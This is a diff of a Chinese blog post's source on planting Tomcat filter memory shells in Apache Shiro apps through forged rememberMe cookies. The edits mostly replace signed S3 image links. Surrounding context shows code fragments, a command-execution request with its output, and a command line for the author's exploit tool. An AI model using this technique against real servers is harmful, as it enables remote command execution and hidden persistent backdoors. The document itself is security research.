@@ -8,7 +8,7 @@ updated: 2023-06-28T00:00:00+00:00
 date: 2023-05-20T00:00:00+00:00
 slug: attacking-shiro-with-tomcat-memshell
 title: 利用Tomcat内存马攻击Shiro应用
-cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/20afd286-40f2-4484-8f4e-bb086ab05975/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241021%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241021T023341Z&X-Amz-Expires=3600&X-Amz-Signature=9fbecf8909a57f520f08e20b46f84d32bdcf6424d33a5a6cce9a2af3bf03521c&X-Amz-SignedHeaders=host&x-id=GetObject
+cover: /img/post/attacking-shiro-with-tomcat-memshell/4.png
 id: 111906e1-7468-803d-ad61-c0422e2c275a
 ---
 
@@ -26,15 +26,17 @@ id: 111906e1-7468-803d-ad61-c0422e2c275a
 
 想要达到命令执行结果作为响应回显输出，就必然需要先控制 HTTP 请求与响应对象，在 Tomcat 中用于处理 HTTP 请求与响应的核心类是 org.apache.coyote.Request 和 org.apache.coyote.Response。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ded61b21-aafa-4784-a7b9-342d0e2127ab/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241021%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241021T023342Z&X-Amz-Expires=3600&X-Amz-Signature=af46429f6ff48616a91ac8e80d372e435f3e7b1b4975a2686a46fe87f381ffd9&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro-with-tomcat-memshell/0.png)
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/dd597acd-6430-4204-be40-2cf9d911e082/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241021%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241021T023342Z&X-Amz-Expires=3600&X-Amz-Signature=5a079322da7621b62f03c7b71fd9bea7a8c744c59c1c9da7b2ae2549d373ad28&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro-with-tomcat-memshell/1.png)
+
 
 Request 类封装了客户端发送到服务器的所有请求信息，包括请求行、头信息、参数和正文内容，而 Response 类封装了服务器发送给客户端的所有响应信息，包括状态码、头信息和正文内容。
 
 受[《基于全局储存的新思路 | Tomcat 的一种通用回显方法研究》](https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A)一文得到的启发，我们通过遍历线程组来寻找 Request 和 Response 对象。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c2c0e535-90cd-493a-a8a3-a92612616c79/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241021%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241021T023342Z&X-Amz-Expires=3600&X-Amz-Signature=065f02efaed11941903d598d2085ab105e3b3f919771d8deb38b6ae9761d6da1&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro-with-tomcat-memshell/2.png)
+
 
 构造如下核心代码用于获取 Request 对象，有了 Request，Response 便也能获取到。
 
@@ -66,7 +68,7 @@ for (int i = 0; i < threads.length; ++i) {
                         // ...
                         flag = true;
                     }
-
+                 
                     // ...
 
                     if (flag) {
@@ -213,7 +215,7 @@ public class TomcatEcho extends AbstractTranslet {
 
 将如上类配合 CB1 链并进行 AES 加密，生成恶意的 Shiro rememberMe Cookie，然后发送 HTTP 请求，结果如下，成功执行 pwd 命令。
 
-```text
+```http
 GET /login.jsp HTTP/1.1
 Host: 192.168.1.100:8089
 CMD: pwd
@@ -222,7 +224,7 @@ Connection: close
 
 ```
 
-```text
+```http
 HTTP/1.1 200 OK
 Server: Apache-Coyote/1.1
 Date: Wed, 22 May 2023 11:17:49 GMT
@@ -301,7 +303,8 @@ public void getReqResp(Object obj) {
 
 现在有了 Request 和 StandardContext，终于可以构造 Filter 内存马了，但会发现生成的 Payload 长度非常大，已经超过 Tomcat 默认 8K 的 maxHttpHeaderSize，超出这个大小后 Tomcat 便会返回 400 状态码。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/eef2980b-634c-4556-ad1a-22e7ed3d6d7d/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241021%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241021T023342Z&X-Amz-Expires=3600&X-Amz-Signature=4633e54f1e0f7f26cb6002f8dbe5fb77c1a85c07d0b9e2788aa91d7fb15925d3&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro-with-tomcat-memshell/3.png)
+
 
 运用先前学到的 Java 类加载知识，将添加 Filter 的恶意类作为 POST 参数值进行传递。
 
@@ -392,9 +395,9 @@ public class DefineClass extends AbstractTranslet {
 
 ## 工具自动化利用
 
-最终，根据以上所有，编写一个自动化利用的工具 ShiroAttack。
+最终，根据以上所有，编写一个自动化利用的工具 ShiroMemShellAttack。
 
-- [https://github.com/0xf4n9x/ShiroMemShellAttack](https://github.com/0xf4n9x/ShiroMemShellAttack)
+- https://github.com/0xf4n9x/ShiroMemShellAttack
 
 ### TomcatEcho
 
@@ -424,18 +427,19 @@ $ java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.100:808
 
 Filter 型内存马注入，已在 Tomcat 7.0.10、7.0.109、8.5.54、9.0.10、9.0.70 版本上测试攻击成功，但 6.0.53、7.0.0 和 10.0.0 版本上攻击失败。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/b6c5c0c9-cc86-4460-b110-89d422126822/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241021%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241021T023342Z&X-Amz-Expires=3600&X-Amz-Signature=61b0351871815879c7dd7aea6a2070fdeb726435d3e095f9e7b68d54b694634e&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro-with-tomcat-memshell/4.png)
+
 
 ## 参考
 
-[https://0xf4n9x.github.io/tomcat-filter-memshell](https://0xf4n9x.github.io/tomcat-filter-memshell)
+https://0xf4n9x.github.io/tomcat-filter-memshell
 
-[https://0xf4n9x.github.io/java-classloader](https://0xf4n9x.github.io/java-classloader.html)
+https://0xf4n9x.github.io/java-classloader
 
-[https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A](https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A)
+https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A
 
-[https://xz.aliyun.com/t/7348](https://xz.aliyun.com/t/7348)
+https://xz.aliyun.com/t/7348
 
-[https://github.com/KpLi0rn/shiro_attack](https://github.com/KpLi0rn/shiro_attack)
+https://github.com/KpLi0rn/shiro_attack
 
-[https://github.com/0xf4n9x/ShiroAttack](https://github.com/0xf4n9x/ShiroAttack)
+https://github.com/0xf4n9x/ShiroMemShellAttack
